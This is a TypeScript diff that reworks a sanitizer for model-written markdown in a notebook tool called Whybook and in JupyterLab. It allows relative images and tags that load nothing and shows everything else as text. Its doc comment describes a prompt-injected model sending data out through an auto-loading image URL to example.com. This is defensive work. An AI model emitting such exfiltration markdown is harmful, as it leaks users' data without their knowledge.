@@ -292,17 +292,239 @@ export function introText(options: {
 }
 
 /**
- * Markdown with a model's text in it, made so that nothing in it loads by
- * itself when the cell shows, in Whybook or in JupyterLab's notebook.
- * JupyterLab's sanitizer keeps images, video, audio, image inputs and CSS
- * backgrounds with a URL, so a model that a prompt injection steers could
- * write `![x](https://example.com/?d=...)` and send data out with no click.
- * An image shows as its text, `!\[x](...)`, and an HTML tag as its text,
- * `&lt;img ...>`. Links, code, bold, lists and tables render as before; in a
- * code span, a tag shows its `&lt;`.
+ * Markdown with a model's text in it, made so that nothing in it loads from
+ * another host by itself when the cell shows, in Whybook or in JupyterLab's
+ * notebook. JupyterLab's sanitizer keeps images, video, audio, image inputs
+ * and CSS backgrounds with a URL, so a model that a prompt injection steers
+ * could write `![x](https://example.com/?d=...)` and send data out with no
+ * click.
+ *
+ * An image at a path relative to the notebook stays, such as
+ * `![plot](figures/plot.png)` or `<img src="plot.png" width="300">`, since the
+ * notebook's own server sends it. So do the tags that load nothing, such as
+ * `<span style="color: #c00">`, `<sub>`, `<br>` and `<details>`, with
+ * attributes that load nothing, and a link written as `<https://...>`. Any
+ * other image shows as its text, `!\[x](...)`, and any other tag as its text,
+ * `&lt;img ...>`. A tag stays only in the plain form that every HTML parser
+ * reads the same way: `<img/src=...>`, which a browser reads as an image with
+ * a source, shows as text. Links, code, bold, lists and tables render as
+ * before; in a code span, a tag that does not stay shows its `&lt;`.
  */
 export function inertMarkdown(text: string): string {
-  return text.replace(/!\[/g, '!\\[').replace(/<(?=[A-Za-z/!?])/g, '&lt;');
+  const parts: string[] = [];
+  let done = 0;
+  const start = /!\[|<(?=[A-Za-z/!?])/g;
+  for (let found = start.exec(text); found; found = start.exec(text)) {
+    const at = found.index;
+    const kept = found[0] === '<' ? keptTag(text, at) : keptImage(text, at);
+    if (kept) {
+      start.lastIndex = at + kept;
+      continue;
+    }
+    parts.push(text.slice(done, at), found[0] === '<' ? '&lt;' : '!\\[');
+    done = at + found[0].length;
+  }
+  parts.push(text.slice(done));
+  return parts.join('');
+}
+
+/** The HTML tags that load nothing by themselves. */
+const INERT_TAGS = new Set([
+  'a',
+  'abbr',
+  'b',
+  'bdi',
+  'bdo',
+  'big',
+  'blockquote',
+  'br',
+  'caption',
+  'center',
+  'cite',
+  'code',
+  'col',
+  'colgroup',
+  'dd',
+  'del',
+  'details',
+  'dfn',
+  'div',
+  'dl',
+  'dt',
+  'em',
+  'figcaption',
+  'figure',
+  'font',
+  'h1',
+  'h2',
+  'h3',
+  'h4',
+  'h5',
+  'h6',
+  'hr',
+  'i',
+  'img',
+  'ins',
+  'kbd',
+  'li',
+  'mark',
+  'ol',
+  'p',
+  'pre',
+  'q',
+  'rp',
+  'rt',
+  'ruby',
+  's',
+  'samp',
+  'small',
+  'span',
+  'strike',
+  'strong',
+  'sub',
+  'summary',
+  'sup',
+  'table',
+  'tbody',
+  'td',
+  'tfoot',
+  'th',
+  'thead',
+  'time',
+  'tr',
+  'tt',
+  'u',
+  'ul',
+  'var',
+  'wbr'
+]);
+
+/**
+ * The attributes that load nothing. An image's `src`, a link's `href` and
+ * `style` have checks of their own; any other attribute, such as `srcset`,
+ * `poster` or `background`, makes its tag show as text.
+ */
+const INERT_ATTRIBUTES = new Set([
+  'abbr',
+  'align',
+  'alt',
+  'bgcolor',
+  'border',
+  'cellpadding',
+  'cellspacing',
+  'class',
+  'color',
+  'colspan',
+  'datetime',
+  'dir',
+  'face',
+  'height',
+  'lang',
+  'open',
+  'rel',
+  'reversed',
+  'rowspan',
+  'scope',
+  'size',
+  'span',
+  'start',
+  'target',
+  'title',
+  'type',
+  'valign',
+  'width'
+]);
+
+/** The CSS functions of colours and lengths, which load nothing. */
+const CSS_FUNCTIONS = new Set([
+  'calc',
+  'clamp',
+  'hsl',
+  'hsla',
+  'hwb',
+  'lab',
+  'lch',
+  'max',
+  'min',
+  'oklab',
+  'oklch',
+  'rgb',
+  'rgba'
+]);
+
+// HTML's own spaces: a parser reads any other character, such as a no-break
+// space, as part of a name. A value without quotes ends where HTML ends it.
+// No value holds `<`, `>`, `[` or `]`, and no link or title of an image holds
+// `[`, `(` or `!` either: if JupyterLab's markdown parser read a kept tag,
+// image or link as plain text, no image could start inside it.
+const START_TAG =
+  /<([A-Za-z][A-Za-z0-9]*)((?:[ \t\n\f\r]+[A-Za-z][A-Za-z0-9-]*(?:[ \t\n\f\r]*=[ \t\n\f\r]*(?:"[^"<>[\]]*"|'[^'<>[\]]*'|[^ \t\n\f\r"'=<>`[\]]+))?)*)[ \t\n\f\r]*\/?>/y;
+const ATTRIBUTE =
+  /([A-Za-z][A-Za-z0-9-]*)(?:[ \t\n\f\r]*=[ \t\n\f\r]*("[^"<>[\]]*"|'[^'<>[\]]*'|[^ \t\n\f\r"'=<>`[\]]+))?/g;
+const END_TAG = /<\/([A-Za-z][A-Za-z0-9]*)[ \t\n\f\r]*>/y;
+const AUTOLINK = /<https?:\/\/[A-Za-z0-9._~:/?#@$&'*+,;=%-]*>/y;
+const IMAGE =
+  /!\[[^[\]\\<>\n]*\]\(([^ \t\n\f\r()<>"'\\]+)(?:[ \t]+"[^"\\<>\n[\]()!]*")?\)/y;
+
+/**
+ * Whether an address is a path relative to the notebook: no scheme, no host,
+ * no backslash and no character reference, so that the browser cannot read
+ * another host into it.
+ */
+const RELATIVE = /^(?![/\\])[A-Za-z0-9._~%!$+,;=@?#/-]+$/;
+
+/** The length of the tag at `at` when it loads nothing, else 0. */
+function keptTag(text: string, at: number): number {
+  AUTOLINK.lastIndex = at;
+  const link = AUTOLINK.exec(text);
+  if (link) {
+    return link[0].length;
+  }
+  END_TAG.lastIndex = at;
+  const end = END_TAG.exec(text);
+  if (end) {
+    return INERT_TAGS.has(end[1].toLowerCase()) ? end[0].length : 0;
+  }
+  START_TAG.lastIndex = at;
+  const tag = START_TAG.exec(text);
+  const name = tag?.[1].toLowerCase() ?? '';
+  if (!tag || !INERT_TAGS.has(name)) {
+    return 0;
+  }
+  for (const [, key, quoted] of tag[2].matchAll(ATTRIBUTE)) {
+    const attribute = key.toLowerCase();
+    const value = (quoted ?? '').replace(/^(["'])([^]*)\1$/, '$2');
+    const inert =
+      INERT_ATTRIBUTES.has(attribute) ||
+      (attribute === 'href' && name === 'a') ||
+      (attribute === 'src' && name === 'img' && RELATIVE.test(value)) ||
+      (attribute === 'style' && inertStyle(value));
+    if (!inert) {
+      return 0;
+    }
+  }
+  return tag[0].length;
+}
+
+/** The length of the image at `at` when its address is relative, else 0. */
+function keptImage(text: string, at: number): number {
+  IMAGE.lastIndex = at;
+  const image = IMAGE.exec(text);
+  return image && RELATIVE.test(image[1]) ? image[0].length : 0;
+}
+
+/**
+ * Whether a style loads nothing: no escape, no character reference, and no
+ * function but those of colours and lengths, so no `url()` or `image-set()`.
+ */
+function inertStyle(style: string): boolean {
+  return (
+    !/[\\&<>@]/.test(style) &&
+    (style.match(/[A-Za-z0-9_-]*\(/g) ?? []).every(call => {
+      const name = call.slice(0, -1).toLowerCase();
+      return !name || CSS_FUNCTIONS.has(name);
+    })
+  );
 }
 
 /** What a kernel has, as its kernel_facts program says, for the agent. */
